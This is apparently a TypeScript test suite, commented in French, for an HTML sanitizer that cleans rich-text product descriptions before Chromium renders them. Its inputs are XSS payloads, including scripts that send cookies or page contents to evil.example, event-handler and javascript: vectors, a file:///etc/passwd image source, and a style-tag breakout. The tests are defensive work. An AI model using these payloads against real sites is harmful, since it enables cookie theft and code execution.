import { test } from "node:test";
import assert from "node:assert/strict";
import { buildDocument, cssColor, sanitizeRichHtml, styleElement } from "./html";

/**
 * Ces assertions sont une barriere de securite, pas un confort.
 *
 * Le HTML des descriptions produit est rendu par Chromium, qui execute le
 * JavaScript. Sans ce filtre, un <script> colle dans une description en
 * back-office s'executerait dans le conteneur de rendu, avec acces reseau.
 * Toute regression ici est une execution de code arbitraire.
 */

test("supprime les vecteurs d'execution de script", () => {
  const dirty = `
    <p>Legitime</p>
    <script>fetch('http://evil.example/'+document.cookie)</script>
    <img src=x onerror="fetch('http://evil.example/xss')">
    <a href="javascript:alert(1)">lien</a>
    <iframe src="http://evil.example"></iframe>
    <svg onload="alert(1)"></svg>
    <div style="background-image:url('http://evil.example/track.png')">fond</div>
  `;
  const clean = sanitizeRichHtml(dirty);

  assert.doesNotMatch(clean, /<script/i, "balise script");
  assert.doesNotMatch(clean, /onerror/i, "attribut onerror");
  assert.doesNotMatch(clean, /onload/i, "attribut onload");
  assert.doesNotMatch(clean, /javascript:/i, "URL javascript:");
  assert.doesNotMatch(clean, /<iframe/i, "balise iframe");
  assert.doesNotMatch(clean, /<svg/i, "balise svg");
  // Une URL distante dans une propriete CSS suffit a tracer un rendu.
  assert.doesNotMatch(clean, /evil\.example/i, "toute reference au domaine hostile");
  assert.match(clean, /<p>Legitime<\/p>/, "le contenu legitime survit");
});

test("refuse les schemas d'URL dangereux sur les images", () => {
  const clean = sanitizeRichHtml('<img src="file:///etc/passwd"><img src="https://ok.example/a.png">');
  // file:// exposerait le filesystem du conteneur de rendu.
  assert.doesNotMatch(clean, /file:/i);
  assert.match(clean, /https:\/\/ok\.example\/a\.png/);
});

test("conserve la mise en forme produite par les editeurs WYSIWYG", () => {
  const dirty = `
    <h3>Titre</h3>
    <p><strong>gras</strong> <em>italique</em> <u>souligne</u></p>
    <ul><li>un</li><li>deux</li></ul>
    <table><thead><tr><th>Element</th></tr></thead><tbody><tr><td colspan="2">Acier</td></tr></tbody></table>
    <p style="text-align:justify">justifie</p>
  `;
  const clean = sanitizeRichHtml(dirty);

  for (const tag of ["h3", "strong", "em", "u", "ul", "li", "table", "thead", "th", "tbody", "td"]) {
    assert.match(clean, new RegExp(`<${tag}[ >]`), `balise ${tag} conservee`);
  }
  assert.match(clean, /colspan="2"/, "colspan conserve");
  assert.match(clean, /text-align:justify/, "alignement conserve");
});

test("tolere les entrees vides", () => {
  assert.equal(sanitizeRichHtml(null), "");
  assert.equal(sanitizeRichHtml(undefined), "");
  assert.equal(sanitizeRichHtml(""), "");
});

test("une feuille de template ne peut pas refermer sa balise <style>", () => {
  const piege = "body{color:red}</style><script>fetch('http://x/'+document.body.innerHTML)</script><style>";
  const html = buildDocument({ bodyHtml: "<p>ok</p>", templateCss: piege, locale: "fr", title: "t" });
  // Le parseur HTML ne sort du texte brut d'un <style> qu'a la sequence
  // `</style` : il ne doit en rester que les trois fermetures legitimes
  // (jetons de couleur, base d'impression, template). Le <script> reste alors
  // du texte inerte, a l'interieur de la feuille.
  assert.equal(html.match(/<\/style/gi)?.length, 3);
  // Casse indifferente, comme le parseur HTML.
  assert.equal(styleElement("a{}</STYLE ><img src=x>").match(/<\/style/gi)?.length, 1);
});

test("styleElement laisse intacte une feuille ordinaire", () => {
  const css = '@media (width < 600px) { .a > .b { content: "<b>"; } }';
  assert.equal(styleElement(css), `<style>${css}</style>`);
  assert.equal(styleElement(""), "");
  assert.equal(styleElement(null), "");
});

test("cssColor n'accepte qu'un hexadecimal ou un nom de couleur", () => {
  assert.equal(cssColor("#c0ffee"), "#c0ffee");
  assert.equal(cssColor("teal"), "teal");
  assert.equal(cssColor("red; } body { display: none"), "#1a1a1a");
});
